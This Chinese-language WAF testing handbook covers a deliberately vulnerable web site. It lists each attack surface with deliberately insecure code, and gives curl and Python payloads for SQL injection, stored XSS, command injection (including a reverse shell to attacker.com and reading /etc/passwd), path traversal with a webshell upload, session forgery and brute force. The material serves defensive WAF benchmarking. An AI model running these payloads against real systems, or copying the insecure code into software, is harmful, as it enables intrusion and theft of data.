# WAF 测试站点 — 攻击手册

本文档列出目标站点 **所有攻击面** 及对应的攻击 payload，供 WAF 测试人员使用。

---

## 目标地址

```bash
# 无 WAF 直连
TARGET="http://<服务器IP>:3000"

# WAF 前置
TARGET="http://<WAF_IP>:<WAF_PORT>"
```

---

## 1. SQL 注入

### 1.1 登录绕过 — `POST /login`

**漏洞代码：**
```js
const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**攻击方法：**

| Payload (username字段) | 说明 |
|------------------------|------|
| `' OR '1'='1' --` | 万能密码 |
| `admin'--` | 注释绕过 |
| `' OR 1=1 OR '` | 恒真条件 |
| `') OR ('1'='1` | 括号闭合 |

**curl：**
```bash
# 万能密码登录
curl -v -X POST "$TARGET/login" \
  -d "username=' OR '1'='1' --&password=anything"

# admin 注释绕过
curl -v -X POST "$TARGET/login" \
  -d "username=admin'--&password=xxx"

# 括号闭合
curl -v -X POST "$TARGET/login" \
  -d "username=') OR ('1'='1&password=x"
```

**Python：**
```python
import requests

s = requests.Session()
# 万能密码 — 成功则 302 跳转到 dashboard
r = s.post(f"{TARGET}/login",
    data={"username": "' OR '1'='1' --", "password": "x"},
    allow_redirects=False)
assert r.status_code == 302  # WAF 未拦截时应 302
```

---

### 1.2 API 用户查询 — `GET /api/users?name=`

**漏洞代码：**
```js
const sql = `SELECT ... FROM users WHERE username LIKE '%${name}%'`;
```

| Payload | 预期结果（无WAF） |
|---------|------------------|
| `admin` | 返回 1 条 |
| `' OR '1'='1` | 返回全部 5 条 |
| `' AND 1=1 --` | 返回 5 条（布尔盲注-真） |
| `' AND 1=2 --` | 返回 0 条（布尔盲注-假） |
| `' UNION SELECT 1,2,3,4,5 --` | UNION 注入 |

**curl：**
```bash
# 恒真注入 — 返回全部用户
curl "$TARGET/api/users?name='%20OR%20'1'='1"

# 布尔盲注（真 → 5条）
curl "$TARGET/api/users?name='%20AND%201=1%20--"

# 布尔盲注（假 → 0条）
curl "$TARGET/api/users?name='%20AND%201=2%20--"

# UNION 注入
curl "$TARGET/api/users?name='%20UNION%20SELECT%201,2,3,4,5%20--"

# URL 编码绕过
curl "$TARGET/api/users?name=%27%20OR%20%271%27%3D%271"
```

**Python：**
```python
import requests

# 基准 — 正常查询 1 条
r = requests.get(f"{TARGET}/api/users", params={"name": "admin"})
print(f"正常: {len(r.json()['data'])} 条")  # → 1

# SQL 注入 — 全表 5 条
r = requests.get(f"{TARGET}/api/users", params={"name": "' OR '1'='1"})
print(f"注入: {len(r.json()['data'])} 条")  # → 5
```

---

### 1.3 商品搜索 — `GET /products?q=`

```bash
# 恒真注入 — 返回全部商品
curl "$TARGET/products?q='%20OR%201=1%20--"

# UNION 注入
curl "$TARGET/products?q='%20UNION%20SELECT%201,2,3,4,5,6%20--"
```

---

### 1.4 商品详情 URL 注入 — `GET /products/:id`

```bash
# 恒真注入
curl "$TARGET/products/1%20OR%201=1"
```

---

### 1.5 注册注入 — `POST /register`

```bash
curl -X POST "$TARGET/register" \
  -d "username=inject_'--&password=pass&email=a@b.com"
```

---

### 1.6 评论注入 — `POST /products/1/comment`

```bash
curl -X POST "$TARGET/products/1/comment" \
  -d "username=x&content=test') --"
```

---

### 1.7 留言注入 — `POST /contact`

```bash
curl -X POST "$TARGET/contact" \
  -d "name=x&email=a@b.com&message=test') --"
```

---

### 1.8 资料更新注入 — `POST /profile`（需登录）

```bash
# Step1: 登录
curl -c /tmp/cookie -X POST "$TARGET/login" \
  -d "username=test&password=test123"

# Step2: 注入更新
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=x@a.com' --&bio=hacked&avatar_url="
```

---

### 1.9 API 商品查询注入 — `GET /api/products?category=`

```bash
curl "$TARGET/api/products?category=手机'%20OR%201=1%20--"
```

---

## 2. XSS 跨站脚本

### 2.1 商品评论 — `POST /products/1/comment`

> 注入后访问 `GET /products/1` 查看存储的 XSS payload

| Payload 示例 |
|-------------|
| `<script>alert(1)</script>` |
| `<img src=x onerror=alert(1)>` |
| `<svg onload=alert(1)>` |
| `<body onload=alert(1)>` |
| `<iframe src=javascript:alert(1)>` |
| `<ScRiPt>alert(1)</ScRiPt>` |
| `<img/src=x/onerror=alert(1)>` |
| `<div onmouseover=alert(1)>` |

**curl：**
```bash
# 注入 XSS payload
curl -X POST "$TARGET/products/1/comment" \
  -d "username=xss_test&content=<script>alert(1)</script>"

# 验证页面未转义
curl "$TARGET/products/1" | grep -c '<script>alert'
```

**Python：**
```python
s = requests.Session()
for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
                "<ScRiPt>alert(1)</ScRiPt>"]:
    s.post(f"{TARGET}/products/1/comment",
           data={"username": "xss", "content": payload})
r = s.get(f"{TARGET}/products/1")
for payload in ["<script>", "onerror=", "<ScRiPt>"]:
    if payload in r.text:
        print(f"[!] 未转义: {payload}")
```

---

### 2.2 留言板 — `POST /contact`

```bash
curl -X POST "$TARGET/contact" \
  -d "name=xss&email=xss@test.com&message=<script>alert(2)</script>"

# 验证
curl "$TARGET/contact" | grep '<script>alert'
```

---

## 3. 命令注入

### 攻击点 — `POST /profile`

参数 `avatar_url` 直接传入 `child_process.exec()`：

```js
const cmd = `curl -o uploads/avatar_${id}.png "${avatarUrl}"`;
exec(cmd, ...);  // 无过滤
```

**curl（需登录后）：**

```bash
# 登录
curl -c /tmp/cookie -X POST "$TARGET/login" \
  -d "username=test&password=test123"

# 分号注入
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com; id"

# 管道注入
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com | ls /"

# 逻辑与注入
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com && whoami"

# 子命令注入
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com \$(id)"

# 反弹 shell
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com; nc -e /bin/sh attacker.com 4444"

# 文件读取
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com; cat /etc/passwd"

# 换行绕过 (CRLF)
curl -b /tmp/cookie -X POST "$TARGET/profile" \
  -d "email=a@b.com&bio=test&avatar_url=http://x.com%0aid"
```

---

## 4. 路径遍历

### 攻击点 — `POST /profile/upload`

文件名直接使用客户端的 `file.originalname`，不做过滤。

**curl（需登录后）：**

```bash
# 基础遍历
curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
  -F "file=@/etc/hosts;filename=../../../etc/passwd"

# URL 编码
curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
  -F "file=@/etc/hosts;filename=..%2f..%2f..%2fetc%2fpasswd"

# 双写绕过
curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
  -F "file=@/etc/hosts;filename=....//....//....//etc/passwd"

# Null byte 截断
curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
  -F "file=@/etc/hosts;filename=../../etc/passwd%00.png"

# 绝对路径
curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
  -F "file=@/etc/hosts;filename=/etc/passwd"

# WebShell 上传（PHP 环境）
curl -b /tmp/cookie -X POST "$TARGET/profile/upload" \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"
```

**Python：**
```python
import requests

s = requests.Session()
s.post(f"{TARGET}/login", data={"username": "test", "password": "test123"})

files = {"file": ("../../../etc/passwd", b"malicious", "text/plain")}
r = s.post(f"{TARGET}/profile/upload", files=files)
print(f"HTTP {r.status_code}")  # 无WAF → 302
```

---

## 5. 认证绕过

### 5.1 万能密码

```bash
curl -v -X POST "$TARGET/login" \
  -d "username=' OR '1'='1' --&password=x"
```

### 5.2 未授权访问

```bash
# 无 cookie 直接访问需认证页面
curl -v "$TARGET/dashboard"   # 无WAF → 302 重定向

# 伪造 session
curl -v -b "connect.sid=s:fake123" "$TARGET/dashboard"
```

### 5.3 暴力破解

```bash
# 字典爆破
for user in admin test alice bob; do
  for pass in password 123456 admin test123 pass1; do
    curl -s -o /dev/null -w "%{http_code} " \
      -X POST "$TARGET/login" -d "username=$user&password=$pass"
  done
  echo ""
done
```

---

## 6. API 模糊测试

### 6.1 参数变异

```bash
# 空值
curl "$TARGET/api/users?name="

# 超长参数
curl "$TARGET/api/users?name=$(python3 -c 'print("A"*4096)')"

# 特殊字符
curl "$TARGET/api/users?name=<>&'%22{}[]\\|;:"
```

### 6.2 SQL 关键字探测

```bash
for kw in SELECT UNION DROP INSERT DELETE UPDATE EXEC SLEEP; do
  echo -n "$kw: "
  curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/users?name=$kw"
  echo ""
done
```

### 6.3 HTTP 方法探测

```bash
for method in GET POST PUT DELETE OPTIONS PATCH HEAD; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method "$TARGET/api/users"
  echo ""
done
```

### 6.4 混合攻击

```bash
# SQL + XSS
curl "$TARGET/api/users?name=';<script>alert(1)</script>--"

# SQL + HTML
curl "$TARGET/api/users?name=<div>' OR 1=1 --</div>"

# 路径 + 命令
curl "$TARGET/api/users?name=../../../tmp;id"
```

---

## 攻击面汇总表

| # | 路由 | 方法 | 攻击类型 | 需登录 |
|---|------|------|----------|--------|
| 1 | `/login` | POST | SQL 注入 | 否 |
| 2 | `/api/users` | GET | SQL 注入 | 否 |
| 3 | `/products` | GET | SQL 注入 | 否 |
| 4 | `/products/:id` | GET | SQL 注入 | 否 |
| 5 | `/register` | POST | SQL 注入 | 否 |
| 6 | `/products/:id/comment` | POST | SQL 注入 + XSS | 否 |
| 7 | `/contact` | POST | SQL 注入 + XSS | 否 |
| 8 | `/profile` | POST | SQL 注入 + 命令注入 | 是 |
| 9 | `/profile/upload` | POST | 路径遍历 | 是 |
| 10 | `/api/products` | GET | SQL 注入 | 否 |
| 11 | `/api/*` | ALL | 模糊测试 | 否 |

---

## 快速验证（无 WAF 基准）

```bash
#!/bin/bash
TARGET="${1:-http://localhost:3000}"

echo "=== 1. SQL 注入 ==="
echo -n "  正常 → " && curl -s "$TARGET/api/users?name=admin" | python3 -c "import sys,json;print(len(json.load(sys.stdin)['data']),'条')"
echo -n "  注入 → " && curl -s "$TARGET/api/users?name='%20OR%20'1'='1" | python3 -c "import sys,json;print(len(json.load(sys.stdin)['data']),'条')"

echo "=== 2. XSS ==="
curl -s -X POST "$TARGET/contact" -d "name=x&email=x@x.com&message=<script>alert(1)</script>" -o /dev/null -w "  留言XSS: HTTP %{http_code}\n"
curl -s "$TARGET/contact" | grep -q '<script>alert' && echo "  [✓] 未转义" || echo "  [✗] 已转义"

echo "=== 3. 命令注入 ==="
curl -c /tmp/cj -s -X POST "$TARGET/login" -d "username=test&password=test123" -o /dev/null -w ""
curl -b /tmp/cj -s -X POST "$TARGET/profile" -d "email=a@b.com&bio=test&avatar_url=http://x.com;id" -o /dev/null -w "  命令注入: HTTP %{http_code}\n"

echo "=== 4. 路径遍历 ==="
curl -b /tmp/cj -s -X POST "$TARGET/profile/upload" -F "file=@/etc/hosts;filename=../../../etc/passwd" -o /dev/null -w "  路径遍历: HTTP %{http_code}\n"
```

---

## WAF 测试策略

1. **先无 WAF 直连** → 确认所有攻击均成功 → 建立基准
2. **再接入 WAF** → 重复所有攻击 → 对比拦截效果
3. **混合流量** → 正常请求 + 攻击请求 → 检查误拦率
4. **编码变异** → 对 payload 做 URL/Unicode/双重编码 → 测 WAF 解码能力
5. **并发压力** → 高并发下确认 WAF 不降级漏拦
